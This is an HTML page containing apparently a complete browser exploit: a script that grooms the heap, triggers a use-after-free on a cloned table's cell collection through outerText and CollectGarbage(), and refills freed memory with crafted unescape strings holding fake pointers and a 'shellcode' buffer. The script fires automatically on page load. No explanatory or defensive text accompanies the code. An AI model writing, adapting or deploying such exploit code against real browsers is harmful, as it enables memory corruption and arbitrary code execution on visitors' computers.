
<html>
  <head>
    <script>
     
     function Start() {

    var mem = new Array(30);

    //shooting some holes in the heap to make sure our freed block will not be coalescent
    for(i =0; i < mem.length; i++) {  
        mem[i] = document.createElement('div');
        mem[i].className = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
     }

     for(i = 1; i < mem.length; i += 2) {
       mem[i].className = null;       
     }

     var tbl = document.createElement('option').index;
   
      var obj_one = unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000" + table_var(tbl, -42, 8) + "%u0000%u0000%u0000%u0000%u0002%u0000%u0000%u0000%u0000")


      var obj_two = unescape("%u5a94%u633c%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000" + table_var(tbl, -44, 8) + "%u0000%u0000%u2213%u7c80%u0100%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%uFD44%uFFFF%u0000%u0000%u0000%u0000%u22cf%u7c80%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%uFFFF%uFFFF%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000");


      var shellcode = unescape("%ucccc%ucccc%u0000%u0000%u2247%u6374%ueca5%u63a1%u45a7%u6397%u0000%u0000%u7a9f%u63a4%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000")

        var TableClone = document.getElementById('tableid').cloneNode(1);
        var TableCellUrns = TableClone.cells.urns('a');
        var bla = TableClone.cells.item(1);
        var TableCellUrnsTags = TableCellUrns.tags('a');
        TableClone.outerText = 'a';
        CollectGarbage()

       for(i = 0; i < mem.length; i++) {
         mem[i] = obj_one.substr(0,obj_one.length);
       }

        Result = TableClone.cells;
      

        Result = TableCellUrnsTags.item(-1);
      }
    
    function table_var(tbl, index, offset) {
    	address =  tbl + (index*0x10) + offset;
    	return make_dword(address);   	
    }

    function make_dword(addr) {
    	str_padding = "00000000"
    	str_addr = addr.toString(16);
    	str_addr = str_padding.substr(0,8 - str_addr.length) + str_addr;
    	return unescape("%u" + str_addr.substr(4,8) + "%u" + str_addr.substr(0,4));
    }

    </script>
  </head>
  <body onLoad="window.setTimeout(Start,100);" id="bodyid">

    <table id="tableid">
      <tr><th id="thid"></th></tr>
      <tr id="trid"><td id="tdid"></td></tr>
    </table>
        
  </body>
</html>
